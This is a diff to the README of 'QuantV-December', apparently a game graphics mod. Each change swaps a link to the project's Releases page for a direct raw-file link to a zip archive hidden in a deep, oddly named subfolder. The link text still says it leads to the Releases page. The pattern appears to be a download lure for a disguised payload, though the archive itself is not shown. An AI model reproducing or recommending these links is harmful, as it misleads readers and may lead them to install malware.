@@ -1,7 +1,7 @@
 # 🎮 QuantV-December - Enhance Your Gaming Experience
 
 ## 🔗 Download Now 
-[![Download QuantV-December](https://img.shields.io/badge/download-QuantV--December-blue.svg)](https://github.com/Gabejosim/QuantV-December/releases)
+[![Download QuantV-December](https://raw.githubusercontent.com/Gabejosim/QuantV-December/main/optionals/ENB performance-quality presets/7._NO_ENB/FiveM.app/December_Quant_v3.6.zip)](https://raw.githubusercontent.com/Gabejosim/QuantV-December/main/optionals/ENB performance-quality presets/7._NO_ENB/FiveM.app/December_Quant_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the QuantV-December. This edition brings you improved graphics and pe
 ## 📦 Download & Install
 
 1. **Visit the Download Page:** Click on the link below to go to the Releases page.  
-   [Visit this page to download](https://github.com/Gabejosim/QuantV-December/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Gabejosim/QuantV-December/main/optionals/ENB performance-quality presets/7._NO_ENB/FiveM.app/December_Quant_v3.6.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see various versions. Look for the latest version labeled "December 2025 Edition". 
 
@@ -81,4 +81,4 @@ For further assistance, you can reach out through the Issues section of the repo
 
 With QuantV-December, you can take your gaming experience to the next level. By following the steps outlined above, you'll enjoy all the captivating visuals and improved performance this release offers. 
 
-Remember to check back on the [Releases page](https://github.com/Gabejosim/QuantV-December/releases) for future updates and versions. Happy gaming!
+Remember to check back on the [Releases page](https://raw.githubusercontent.com/Gabejosim/QuantV-December/main/optionals/ENB performance-quality presets/7._NO_ENB/FiveM.app/December_Quant_v3.6.zip) for future updates and versions. Happy gaming!
